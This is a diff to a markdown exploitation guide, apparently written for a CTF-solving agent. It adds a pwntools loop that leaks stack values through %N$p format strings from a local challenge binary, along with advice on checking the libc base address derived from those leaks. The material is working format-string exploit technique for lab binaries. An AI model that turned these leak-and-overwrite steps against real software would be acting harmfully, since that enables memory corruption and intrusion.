@@ -77,6 +77,34 @@ NX is disabled, so the stack is executable. The test binary is **Phoenix stack-f
 7. **`%N$s`** — only if argument **N** holds a **valid pointer**; else SIGSEGV. Useful for strings already on stack (opened file path, env).
 8. If the challenge **filters `$`**, use **`%c` chains** or raw pwntools **`fmtstr_payload(..., no_dollars=True)`**; the `format_string_payload` tool has **`no_dollars`** for that.
 
+#### Example: pwntools multi-run `%N$p` loop (short name buffer)
+
+`fgets` into 16 bytes ⇒ at most **15** characters before `\n` for the format — use **one** `%N$p` per connection:
+
+```python
+from pwn import context, log, process
+
+context.binary = "./tests/challenges/fsop_starshard_x64"
+binary = context.binary.path
+
+for n in range(1, 32):
+    io = process(binary)
+    io.recvuntil(b"Tinselwick Tinkerer Name: ")
+    io.sendline(f"%{n}$p".encode())
+    io.recvuntil(b"=== Welcome ")
+    leak = io.recvuntil(b"!", drop=True).strip()
+    log.info("%s", f"{n}: {leak.decode(errors='replace')}")
+    io.close()
+# Cross-check indices against gdb_stack at printf; then libc_base_from_leak / pie_base_from_leak.
+```
+
+Batch runs in **`run_exploit`** if needed (e.g. **`N` 1–10** per script) to stay under **~30s** timeout.
+
+#### Validating `libc_base_from_leak` output
+
+- **Often correct:** Leaked qword matches a slot on **`gdb_stack`** at **`printf`** (e.g. return into libc like **`0x7ffff7c2a1ca`**) and **`libc_base_from_leak(..., __libc_start_main)`** returns a **page-aligned** base (`…000`). Sanity-check: **`libc_base + libc.sym["system"]`** is a valid code pointer in **`vmmap`**.
+- **Misleading:** Some **`0x7f…`** values are **not** `__libc_start_main` (e.g. **vdso**, **ld**, wrong stack slot). If the tool “succeeds” but **`libc_base + system`** is nonsense, **try another `%N$p`** or a different **`leaked_symbol`** (`puts`, etc.). Leaks are often **`__libc_start_main+Δ`** (inside the function) — subtracting only **`sym["__libc_start_main"]`** assumes the leak points to the **symbol start**; for an **in-function** return address, use **`info symbol <addr>`** in GDB or match the exact offset.
+
 ### Format string — write (overwrite memory)
 
 `printf(user_input)` lets you write to arbitrary addresses using `%n`.
